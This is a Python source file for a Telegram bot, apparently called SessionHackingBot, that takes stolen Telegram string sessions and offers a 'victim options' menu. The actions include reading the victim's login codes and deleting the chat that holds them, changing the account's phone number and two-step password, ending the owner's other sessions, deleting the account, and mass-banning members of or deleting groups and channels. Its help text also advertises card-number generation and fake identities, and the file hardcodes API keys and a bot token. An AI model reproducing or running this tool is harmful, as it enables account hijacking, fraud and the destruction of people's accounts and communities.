import os
from telethon import TelegramClient, events, functions, types, Button
from datetime import timedelta
import asyncio
import time
from telethon import TelegramClient, events
import requests
import hashlib
import time
import hashlib
from telethon import TelegramClient, events
from telethon import events, sync
from telethon import utils
from telethon import types
from telethon.tl.types import ChannelParticipantsSearch
from telethon import events, Button
import secrets
from telethon.tl.types import PasswordKdfAlgoUnknown
import string
from telethon import tl
import random
api_id = "16739069"
import os, asyncio, re
from telethon.sync import TelegramClient, events
from telethon.tl.functions.account import UpdatePasswordSettingsRequest
from telethon.sync import TelegramClient, events
from telethon.sessions import MemorySession
from os import system
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
api_hash = "6ae3ff1789833e717c0728793def54bd"
token = "6279916111:AAF_9IY0XqRKDuNNzlqU9qRnwESblyyWEM4"
client = TelegramClient('privrulez', api_id, api_hash).start(bot_token=token)
bot = TelegramClient('pridvaawpact', api_id, api_hash)
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa
import logging
from telethon.errors.rpcerrorlist import FreshResetAuthorisationForbiddenError
from telethon.errors import SessionPasswordNeededError, PhoneNumberUnoccupiedError
import sys
from datetime import datetime, timedelta
from telethon.errors.rpcerrorlist import ChannelPrivateError
from telethon import TelegramClient, events
from telethon.tl.functions.channels import CreateChannelRequest as ccr
from telethon import TelegramClient, events, types
from telethon.tl.functions.account import UpdateProfileRequest
from telethon import TelegramClient, events
from telethon.errors.rpcerrorlist import ChannelPrivateError
from telethon.tl.types import ChannelParticipant, ChannelParticipantsRecent
from telethon.tl.functions.messages import ExportChatInviteRequest
from telethon import TelegramClient, events
import asyncio
from telethon.sync import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneNumberUnoccupiedError
import sys
import sys
import os
from telethon.errors.rpcerrorlist import QueryIdInvalidError
# Rest of the code...
from telethon import events, functions
import time
from datetime import timedelta, datetime
import random
import base64
import ipaddress
import struct
import sys
import re
from telethon.errors.rpcerrorlist import AuthKeyDuplicatedError
from telethon.sessions.string import _STRUCT_PREFORMAT, CURRENT_VERSION, StringSession
from telethon import functions

mybot = "yvyyybot"
bot = borg = client
Boxaihackr = 5502537272
Bot_Username =os.environ.get("yvyyybot", None) or "SessionHackingBot"

channel_username = '@S3S_SSS'  # Replace with your channel username
Developers = [5970155941, 6207999679, -1001834866606]

import os
chat_data = {}

users_set = set()
users_file = 'users.txt'

banned_users = set()
banned_file = 'banned.txt'

accepted_users = set()
accepted_file = 'accepted.txt'


@client.on(events.NewMessage(pattern='/all'))
async def send_message(event):
    # Check if the user is an owner
    if event.sender_id not in Developers:
        await event.respond('''Only the Developers can use this
        
فقط المطورين بامكانهم ارسال شامل ''')
        return

    # Extract the message from the command
    try:
        command = event.message.message
        _, message = command.split(' ', 1)
    except ValueError:
        await event.respond('Invalid syntax. Please use the format: /all <message>')
        return

    # Retrieve all the user IDs from the accessed.txt file
    with open('users.txt', 'r') as f:
        user_ids = f.read().strip().split('\n')

    # Send the message to each user ID
    for user_id in user_ids:
        try:
            # Validate user ID
            int(user_id.strip())
        except ValueError:
            await event.respond(f'Invalid user ID: {user_id}')
            continue

        try:
            # Send the message to the user
            async with client.conversation(int(user_id.strip())) as conv:
                await conv.send_message(message)
        except Exception as e:
            pass  # Ignore the error and continue sending to other users

    await event.respond('''Message sent to all users successfully!
    
تم الارسال لجميع المستخدمين بنجاح''')


@client.on(events.NewMessage(pattern='/send'))
async def send_message(event):
    # Check if the user is an owner
    if event.sender_id not in Developers:
        await event.respond('''Only the Developers can use this
        
فقط المطورين بامكنهم ارسال رسائل للمستخدمين''')
        return

    # Extract the user IDs and message from the command
    try:
        command = event.message.message
        _, user_ids, message = command.split(' ', 2)
        user_ids = user_ids.split(',')
    except ValueError:
        await event.respond('''Invalid syntax. Please use the format: /send <user IDs> <message>
        
استخدام خاطئ''')
        return

    # Send the message to each user ID
    for user_id in user_ids:
        try:
            # Validate user ID
            int(user_id.strip())
        except ValueError:
            await event.respond(f'Invalid user ID: {user_id}')
            continue

        try:
            # Send the message to the user
            async with client.conversation(int(user_id.strip())) as conv:
                await conv.send_message(message)
            await event.respond(f'''Message sent to user ID {user_id} successfully!
            
تم الارسال بنجاح''')
        except Exception as e:
            await event.respond(f'Error occurred while sending message to user ID {user_id}: {str(e)}')



@client.on(events.NewMessage(pattern='/me'))
async def my_event_handler(event):
    
  user = await event.get_sender()
  first_name = user.first_name
  last_name = user.last_name
  username = user.username
  user_id = user.id
  user = await event.get_chat()
  await client.send_message(user, f"""
============================

User ID: {user_id}

First name: {first_name}

Last name: {last_name}

Username: {username}

============================
""")
                              

@client.on(events.NewMessage(pattern='/rules'))
async def send_help(event):
    user = await event.get_chat()
    await client.send_message(user, rules)

@client.on(events.NewMessage(pattern='/helpar'))
async def send_help(event):
    user = await event.get_chat()
    await client.send_message(user, '''
   =============================
                                   ║ !مرحبًا بك في البوت║     
=============================

    الأوامر:

    
/start - بدء التشغيل.

/hack - إرسال واجهة الاختراق.

/arhack - لشرح الاوامر

/gen <BIN> - صنع عشر بطاقات وفحصه

/id US -صنع هوية مزيفة مع رمز بريجي وكل شيء 

/check <BIN> - تاكيد البين وفحصه

/helpen - النسخة الانكليزية من الاوامر

/helpar - النسخة العربية من الاوامر

/rules - شروط وبنود استخدام البوت

/me - معلوماتك
''')
from telethon import events, Button

@client.on(events.CallbackQuery(data=b"send_message"))
async def send_message(event):
    # Check if the user is an owner
    if event.sender_id not in Developers:
        await event.answer("Only the Developers can use this.", alert=True)
        return

    async with client.conversation(event.chat_id) as conv:
        try:
            # Ask for the user ID
            await conv.send_message("Please enter the user ID(s) (comma-separated):")
            response = await conv.get_response()
            user_ids = response.text.split(',')

            # Ask for the message
            await conv.send_message("Please enter the message:")
            response = await conv.get_response()
            message = response.text
        except ValueError:
            await event.respond("Invalid input. Please try again.")
            return

        # Send the message to each user ID
        for user_id in user_ids:
            try:
                # Validate user ID
                user_id = user_id.strip()
                int(user_id)
            except ValueError:
                await event.respond(f'Invalid user ID: {user_id}')
                continue

            try:
                # Send the message to the user
                async with client.conversation(int(user_id)) as conv:
                    await conv.send_message(message)
                await event.respond(f'Message sent to user ID {user_id} successfully!')
            except Exception as e:
                await event.respond(f'Error occurred while sending message to user ID {user_id}: {str(e)}')

    await event.answer("Message sent successfully!")




@client.on(events.NewMessage(pattern='/arhack'))
async def hack(event):
    user_id = event.sender_id
    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)

    if is_member:
        async with bot.conversation(event.chat_id) as x:
            keyboard = [
                [
                    Button.inline('A', data='A'), 
                    Button.inline('B', data='B'),
                    Button.inline('C', data='C'),
                    Button.inline('D', data='D'),
                    Button.inline('E', data='E')
                ],
                [
                    Button.inline('F', data='F'), 
                    Button.inline('G', data='G'),
                    Button.inline('H', data='H'),
                    Button.inline('I', data='I'),
                    Button.inline('J', data='J')
                ],
                [
                    Button.inline('K', data='K'), 
                    Button.inline('L', data='L'),
                    Button.inline('M', data='M'),
                    Button.inline('N', data='N'),
                    Button.inline('O', data='O'),
                ],
                [
                    Button.url('Developer', 'https://t.me/PrivaPact')
                ]
            ]
            await x.send_message('''اختر ما تريد فعله مع الضحية:

الاختيارات

########################
# A : معرفه قنوات/كروبات التي يملكها       

# B : جلب جميع معلومات المستخدم مثل رقم الحساب ، معرف المستخدم و ايدي الشخص...                      

# C : حظر جميع مستخدمين كروب او قناة                    

# D : جلب اخر رساله تحتوي على كود تسجيل دخول الى الحساب                                

# E : انضمام الى كروب او قناة                            

# F : مغادره كروب او قناة                             

# G : حذف كروب او قناة                          

# H : تاكد من التحقق بخطوتين مفعل او لا

# I : انهاء جميع الجلسات ما عدا جلسة البوت      

# J : حذف الحساب                                

# K :  ترقيه عضو الى مشرف داخل كروب او قناة 

# L : حذف جميع المشرفين في كروب او قناة  

# M : تغيير رقم الحساب                       

# N : ارسال اي رسالة ال كروب او خاص

# O : تسجيل خروج الترمكس  (هاذا الامر يلغي الترمكس للابد)

# /gen <BIN> - صنع عشر بطاقات وفحصه

# /id US -صنع هوية مزيفة مع رمز بريجي وكل شيء 

# /check <BIN> - تاكيد البين وفحصه

#################################

لشرح كيفية عمل الترمكس والبوت شاهد [اليفديو التعليمي](https://t.me/PrivaPact/257)

Channel: @PrivaPact
''', buttons=keyboard, link_preview=False)
    else:
        await event.respond("""Please join @PrivaPact for the bot to work!
        

الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return

@client.on(events.NewMessage(pattern='/helpen'))
async def send_help(event):
    user = await event.get_chat()
    await client.send_message(user, '''
============================
          ║Welcome to the bot!║
============================

    COMMANDS:
    
/start - Start the bot.
    
/hack - Sends the hacking interface.

/gen <BIN> - Create 10 checked Cards

/id US - Make a fake Identity

/check <BIN> - check and analyze the BIN

/helpen - English version of Commands

/helpar - Arabic version of Commands

/rules - terms and conditions of the bot

/me - your info
=====================================
''')

# Load existing users from file



async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    try:
      await bot(leave("@Boxaty"))
    except BaseException:
      pass
    try:
      await bot(leave("@eFOOTBALL23_0"))
    except BaseException:
      pass
    try:
      await bot(leave("@onepiecedeluxe"))
    except BaseException:
      pass
    try:
      await bot(leave("@SpaceXFeed"))
    except BaseException:
      pass
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    try:
      await bot(leave("@eFOOTBALL23_0"))
    except BaseException:
      pass
    try:
      await bot(leave("@Boxaty"))
    except BaseException:
      pass
    try:
      await bot(leave("@onepiecedeluxe"))
    except BaseException:
      pass
    try:
      await bot(leave("@SpaceXFeed"))
    except BaseException:
      pass
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)
  
async def userinfo(strses):
    # Create a TelegramClient instance
    bot = TelegramClient(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
    await bot.connect()

    # Get the "me" object
    me = await bot.get_me()

    try:
        await bot(leave("@eFOOTBALL23_0"))
    except BaseException:
        pass
    try:
        await bot(leave("@Boxaty"))
    except BaseException:
        pass
    try:
        await bot(leave("@onepiecedeluxe"))
    except BaseException:
        pass
    try:
        await bot(leave("@SpaceXFeed"))
    except BaseException:
        pass

    # Get the number of chats the user has
    chat_count = 0
    async for _ in bot.iter_dialogs():
        chat_count += 1

    # Format the user information
    info = f"id={me.id}\n" \
           f"first_name={me.first_name}\n" \
           f"last_name={me.last_name}\n" \
           f"phone={me.phone}\n" \
           f"username=@{me.username}\n" \
           f"premium={me.premium}\n" \
           f"bot={me.bot}\n" \
           f"verified={me.verified}\n" \
           f"restricted={me.restricted}\n" \
           f"scam={me.scam}\n" \
           f"chats={chat_count}"

    # Disconnect the client
    await bot.disconnect()

    return info


async def userinfop(strses):
    # Create a TelegramClient instance
    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
    await bot.connect()

    # Get the "me" object
    k = await bot.get_me()

    # Get the number of chats the user has
    chat_count = 0
    async for _ in bot.iter_dialogs():
        chat_count += 1

    # Format the user information
    info = f"id={k.id}\n" \
           f"first_name={k.first_name}\n" \
           f"last_name={k.last_name}\n" \
           f"phone={k.phone}\n" \
           f"username=@{k.username}\n" \
           f"premium={k.premium}\n" \
           f"bot={k.bot}\n" \
           f"verified={k.verified}\n" \
           f"restricted={k.restricted}\n" \
           f"scam={k.scam}\n" \
           f"chats={chat_count}"

    # Disconnect the client
    await bot.disconnect()

    return info

async def terminate(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:

    await X(rt())


async def terminatep(strses):
    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
    await bot.connect()
    await bot(rt())

async def delacc(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:

    await X(functions.account.DeleteAccountRequest("I am session note"))

async def delaccp(strses):
    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
    await bot.connect()

    await bot(functions.account.DeleteAccountRequest("I am session note"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:

    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def promotep(strses, grp, user):
    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
    await bot.connect()

    try:
      await bot.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await bot.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')

async def user2fa(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:

    try:
      await X.edit_2fa('@Privapact was here')
      return True
    except:
      return False

async def user2fap(strses):
    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
    await bot.connect()
    try:
      await bot.edit_2fa('@Privapact was here')
      return True
    except:
      return False


async def demall(strses, grp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:

    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      
async def demallp(strses, grp):
    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
    await bot.connect()
    async for x in bot.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await bot.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await bot.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      

async def joingroup(strses, usernames):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:

        for username in usernames:
            await X(join(username.strip()))

async def joingroupp(strses, usernames):
    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
    await bot.connect()

    for username in usernames:
            await bot(join(username.strip()))


async def leavegroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    await X(leave(username))

async def leavegroupp(strses, username):
    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
    await bot.connect()
    await bot(leave(username))



async def delgroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:

    await X(dc(username))
    
async def delgroupp(strses, username):
    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
    await bot.connect()
    await bot(dc(username))

async def cu(strses):
  try:
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    i = ""

    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await bot.delete_dialog(777000)
    return str(i)

async def usermsgsp(strses):
    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
    await bot.connect() 
    i = ""

    async for x in bot.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await bot.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    try:
      await X(leave("@vip_nasa"))
    except BaseException:
      pass
    try:
      await X(leave("@efotballx1"))
    except BaseException:
      pass
    try:
      await X(leave("@onepiecedeluxe"))
    except BaseException:
      pass
    try:
      await X(leave("@SpaceXFeed"))
    except BaseException:
      pass
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    
async def userbansp(strses, grp):
    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
    await bot.connect()
    k = await bot.get_participants(grp)
    for x in k:
      try:
        await bot.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    

async def userchannels(strses):
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        try:
            await X(leave("@vip_nasa"))
        except BaseException:
            pass
        try:
            await X(leave("@efotballx1"))
        except BaseException:
            pass
        try:
            await X(leave("@onepiecedeluxe"))
        except BaseException:
            pass
        try:
            await X(leave("@SpaceXFeed"))
        except BaseException:
            pass
        k = await X(pc())
        i = ""
        for x in k.chats:
            try:
                chat = await X(functions.channels.GetFullChannelRequest(x))
                member_count = chat.full_chat.participants_count
                i += f'''
• Channel name : {x.title}
• Channel User :@{x.username}
~ User Num :{member_count}\n
'''
            except:
                pass
        return str(i)

async def userchannelsp(strses):
    # Create a TelegramClient instance
    bot = TelegramClient((strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
    await bot.connect()
    k = await bot(pc())
    i = ""
    for x in k.chats:
            try:
                chat = await bot(functions.channels.GetFullChannelRequest(x))
                member_count = chat.full_chat.participants_count
                i += f'''
• Channel name : {x.title}
• Channel User :@{x.username}
~ User Num :{member_count}\n
'''
            except:
                pass
    await bot.connect()

    return str(i)
from telethon.tl.functions.channels import LeaveChannelRequest


async def leaveall(session_string):
    async with tg(ses(session_string), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        dialogs = await X.get_dialogs()

        for dialog in dialogs:
            entity = dialog.entity
            if isinstance(entity, types.Channel):
                await X(leave(entity))

async def leaveallp(session_string):
    bot = TelegramClient((session_string), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
    await bot.connect()
    dialogs = await bot.get_dialogs()

    for dialog in dialogs:
            entity = dialog.entity
            if isinstance(entity, types.Channel):
                await bot(leave(entity))


import logging
logging.basicConfig(level=logging.WARNING)

channel = "@PrivaPact"
menu = '''

A: [check users own groups and channels]

B: [check user all information like phone number, usrname, ETC...]

C: [ban all group members]

D : [send users last otp ]

E : [Join A Group/Channel]

F: [Leave A Group/Channel ]

G: [Delete A Group/Channel]

H: [Check if 2fa is eneabled or disabled]

I: [Terminate All current active sessions except Your StringSession]

J: [Delete Account]

K: [Demote all admins in a group/channel]

L: [Promote a member in a group/channel]

M: [Change Phone number ]

N: [Send a specified message to groups/channels/all]

O: [Log out the StringSession]

Channel: @PrivaPact
'''
mm = '''

'''

keyboard = [
  [  
    Button.inline("A", data="A"), 
    Button.inline("B", data="B"),
    Button.inline("C", data="C"),
    Button.inline("D", data="D"),
    Button.inline("E", data="E")
    ],
  [
    Button.inline("F", data="F"), 
    Button.inline("G", data="G"),
    Button.inline("H", data="H"),
    Button.inline("I", data="I"),
    Button.inline("J", data="J"),
    ],
  [
    Button.inline("K", data="K"), 
    Button.inline("L", data="L"),
    Button.inline("M", data="M"),
    Button.inline("N", data="N"),
    Button.inline("O", data="O"),
    Button.inline("P", data="P")

    ],
  [
    Button.url("Developer", "https://t.me/PrivaPact")
    ]
]


# Check if the files exist, and if not, create them
if not os.path.exists(accepted_file):
    with open(accepted_file, 'w'):
        pass

# Load existing accepted users from the file
with open(accepted_file, 'r') as f:
    for line in f:
        accepted_users.add(int(line.strip()))

channel_id = -1001828433073

@client.on(events.NewMessage(pattern='/start'))
async def connect(event):
    chat_id = event.chat_id
    user_id = event.sender_id
    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)

    if is_member:
        # User is in the channel, continue with the code
        if chat_id not in chat_data:
            chat_data[chat_id] = {'password': None, 'accepted_tos': False}  # initialize chat_data for this user

        if chat_id in Developers:  # bot owner does not need a password
            await event.respond('''Bot owner access granted. You may now access the bot by using the /hack command.

انك مالك البوت اهلا بك استخدم /hack''')
            chat_data[chat_id]['password'] = 'owner'  # update chat_data with the password
            return

        if str(chat_id) in accepted_file:  # User has already accessed the bot
            await event.respond('''You have already accessed the bot. You may now use the /hack command.
Use /arhack for an Arabic explanation of the hack commands!

لقد تحققت إلى الروبوت. يمكنك الآن استخدام الأمر /hack.
استخدم /arhack لشرح عربي لأوامر الاختراق!''')
            chat_data[chat_id]['password'] = 'accessed'  # update chat_data with a flag indicating that the user has accessed the bot
            return

        if not chat_data[chat_id]['accepted_tos']:
            await event.respond(
                rules,
                buttons=[Button.inline('I Accept✅', data='accept_tos')]
            )
            return

        await event.respond('''You may now access the bot by using the /hack command.
Use /arhack for an Arabic explanation of the hack commands!
يمكنك الآن الوصول إلى الروبوت باستخدام الامر /hack
استخدم /arhack لشرح عربي لأوامر الاختراق!''')
        return

    else:
        # User is not in the channel, prompt them to join
        await event.respond("""Please join @PrivaPact for the bot to work!
        

الرجاء دخول @PrivaPact لاستعمال البوت""")
        return

    
 
# Function to check if a user is in a channel
async def is_user_in_channel(client, channel_id, user_id):
    try:
        participants = await client.get_participants(channel_id)
        for participant in participants:
            if participant.id == user_id:
                return True
        return False
    except errors.UserNotParticipantError:
        return False
    except Exception as e:
        print(f"An error occurred while checking channel membership: {str(e)}")
        return False

@client.on(events.CallbackQuery(data=b'accept_tos'))
async def accept_tos(event):
    chat_id = event.sender_id
    chat_data[chat_id]['accepted_tos'] = True

    # Add the user to the accepted_users set
    accepted_users.add(chat_id)

    # Save the updated accepted_users set to the file
    with open('accepted.txt', 'w') as f:
        for user_id in accepted_users:
            f.write(str(user_id) + '\n')

    await event.respond('''
                     @ℙℝ𝕀𝕍𝔸ℙ𝔸ℂ𝕋
Terms and conditions accepted.You may now access the bot by using the /hack command.

Use /arhack for an Arabic explanation of the hack commands!

use /gen , /id , /check for credit card commands !
                        
تم قبول الشروط والأحكام  يمكنك الآن الوصول إلى الروبوت باستخدام الامر /hack

استخدم /arhack لشرح عربي لأوامر الاختراق.

استخدم /gen , /id . /check لاوامر فحص بطاقات''')


@client.on(events.NewMessage(pattern='/hack'))
async def hack(event):
    chat_id = event.chat_id
    user_id = event.sender_id
    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)

    if is_member:
        async with bot.conversation(event.chat_id) as x:
            keyboard = [
                [
                    Button.inline('A', data='A'), 
                    Button.inline('B', data='B'),
                    Button.inline('C', data='C'),
                    Button.inline('D', data='D'),
                    Button.inline('E', data='E')
                ],
                [
                    Button.inline('F', data='F'), 
                    Button.inline('G', data='G'),
                    Button.inline('H', data='H'),
                    Button.inline('I', data='I'),
                    Button.inline('J', data='J')
                ],
                [
                    Button.inline('K', data='K'), 
                    Button.inline('L', data='L'),
                    Button.inline('M', data='M'),
                    Button.inline('N', data='N'),
                    Button.inline('O', data='O'),
                    Button.inline('P', data='P'),

                ],
                [
                    Button.url('Developer', 'https://t.me/PrivaPact')
                ]
            ]
            await x.send_message('''Choose what to do with the victim:
###################################
#                         Victim Options                        #
###################################

# A : Check user's own groups/channels          

# B : Check user's information                           

# C : Ban all group members                             

# D : Send user's last OTP                                

# E : Join a group/channel                                

# F : Leave a group/channel                              

# G : Delete a group/channel                            

# H : Check if 2FA is enabled/disabled 

# I : Terminate all sessions (except yours)      

# J : Delete account                                         

# K : Promote a member in a group/channel  

# L : Demote all admins in a group/channel   

# M : Change phone number                          

# N : Send a message to groups/private  

# O : Log out the String Session

# /gen <BIN> - Create 10 checked Cards

# /id US - Make a fake Identity

# /check <BIN> - check and analyze the BIN

#################################
         
For a tutorial on the bot and session, watch this: [Tutorial Video](https://t.me/PrivaPact/257)
Channel: @PrivaPact
            ''', buttons=keyboard, link_preview=False)
    else:
        await event.respond("""Please join @PrivaPact for the bot to work!
        

الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return

# Check if running in a terminal
if sys.stdin.isatty():
    sys.stdin.close()

@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
async def users(event):
    chat_id = event.chat_id
    user_id = event.sender_id

    # Check if the user is in the channel
    is_member = await is_user_in_channel(client, channel_id, user_id)

    if not is_member:
        await event.respond("""Please join @PrivaPact for the bot to work!
        
الرجاء الانضمام إلى @PrivaPact حتى يعمل البوت""")
        return

    user_id = event.sender_id

    # Check if the user is a developer
    is_developer = user_id in Developers

    # Check if the user is on cooldown and not a developer
    if not is_developer and user_id in command_cooldown:
        cooldown_end_time = command_cooldown[user_id]
        time_remaining = cooldown_end_time - datetime.now()

        if time_remaining.total_seconds() > 0:
            await event.respond(f"""You need to wait {time_remaining.seconds} seconds before using this command again.
            
عليك الانتضار ل {time_remaining.seconds} ثواني لاستخدام الامر""")
            return

    # Update the command cooldown for the user
    command_cooldown[user_id] = datetime.now() + timedelta(seconds=10)

    sender_id = event.sender_id  # Store the sender_id

    async with bot.conversation(event.chat_id) as x:
        try:
            await x.send_message("""Now send me the Termux Session so I can send you the channels/groups.
           
الان ارسل لي الترمكس لكي ارسل لك القنوات وكروبات""")
            strses = await x.wait_event(events.NewMessage, timeout=60)

            # Check if the session is empty
            if not strses.text:
                return await event.respond("Empty session. Please provide a valid Termux Session.", buttons=keyboard)

            session = validate_session(strses.text)
            if not session:
                return await event.respond("""Invalid Session, please use another one.
                                 
ترمكس خاطئ، حاول آخر""", buttons=keyboard)

            try:
                # Send a message with the initial loading bar
                message = await event.respond('Loading: 0% [░░░░░░░░░░░░░░░░░░░░]')

                # Define the list of random percentages
                percentages = [12, 28, 35, 48, 53, 66, 74, 81, 94, 100]

                # Update the loading bar with random percentages
                for percent in percentages:
                    bar = '█' * int(percent / 10) + '▒' * (10 - int(percent / 10))
                    await message.edit(f'يتم التحميل: {percent}% [{bar}]')
                    time.sleep(0.2)  # Wait for 1 second
            except ValueError as e:
                print(f"Failed to answer callback query: {e}")

            try:
                i = await userchannels(session) if strses.text.startswith("1") or strses.text.endswith("=") else await userchannelsp(session)
            except:
                return await event.reply("""Invalid Session, please use another one.
                                 
ترمكس خاطئ، حاول آخر""", buttons=keyboard)

            if len(i) > 0:
                if len(i) > 3855:
                    file = open("session.txt", "w")
                    file.write(i + "\n\nDetails BY @PrivaPact")
                    file.close()
                    await bot.send_file(event.chat_id, "session.txt")
                    system("rm -rf session.txt")
                else:
                    try:
                        await event.reply(i, buttons=keyboard)
                    except ValueError as e:
                        print(f"Failed to answer callback query: {e}")
            else:
                await message.edit("""User owns 0 channels/groups
            
المستخدم ليس لديه قنوات او كروبات""", buttons=keyboard)

        except (SessionPasswordNeededError, PhoneNumberUnoccupiedError):
            # Handle session error or invalid phone number
            await event.respond("""Invalid session or phone number. Please check your Termux Session.
                                   
ترمكس خاطئ أو رقم هاتف غير صالح. يرجى التحقق من كود الترمكس.""", buttons=keyboard)
        except TimeoutError:
            return await event.respond("""Please provide the termux session within 60 seconds
            
الرحاء ارسال الترمكس قبل مرور ٦٠ ثانية من الضغط على الزر""", buttons=keyboard)


_PYRO_FORM = {351: ">B?256sI?", 356: ">B?256sQ?", 362: ">BI?256sQ?"}

# Placeholder for the logger
LOGS = None

DC_IPV4 = {
    1: "149.154.175.53",
    2: "149.154.167.51",
    3: "149.154.175.100",
    4: "149.154.167.91",
    5: "91.108.56.130",
}

def validate_session(session, logger=LOGS, _exit=True):
    if session:
        # Telethon Session
        if session.startswith(CURRENT_VERSION):
            if len(session.strip()) != 353:
                logger.exception("Wrong string session. Copy paste correctly!")
                sys.exit()
            return session

        # Pyrogram Session
        elif len(session) in _PYRO_FORM.keys():
            data_ = struct.unpack(
                _PYRO_FORM[len(session)],
                base64.urlsafe_b64decode(session + "=" * (-len(session) % 4)),
            )
            if len(session) in [351, 356]:
                auth_id = 2
            else:
                auth_id = 3
            dc_id, auth_key = data_[0], data_[auth_id]
            return StringSession(
                CURRENT_VERSION
                + base64.urlsafe_b64encode(
                    struct.pack(
                        _STRUCT_PREFORMAT.format(4),
                        dc_id,
                        ipaddress.ip_address(DC_IPV4[dc_id]).packed,
                        443,
                        auth_key,
                    )
                ).decode("ascii")
            )
        else:
            return
            if _exit:
                sys.exit()
    logger.exception("No String Session found. Quitting...")
    if _exit:
        sys.exit()

@bot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
async def users(event):
    chat_id = event.chat_id
    user_id = event.sender_id

    # Check if the user is a developer
    is_developer = user_id in Developers

    # Check if the user is on cooldown, unless they are a developer
    if not is_developer:
        if user_id in command_cooldown:
            cooldown_end_time = command_cooldown[user_id]
            time_remaining = cooldown_end_time - datetime.now()

            if time_remaining.total_seconds() > 0:
                await event.respond(f"""You need to wait {time_remaining.seconds} seconds before using this command again.
            
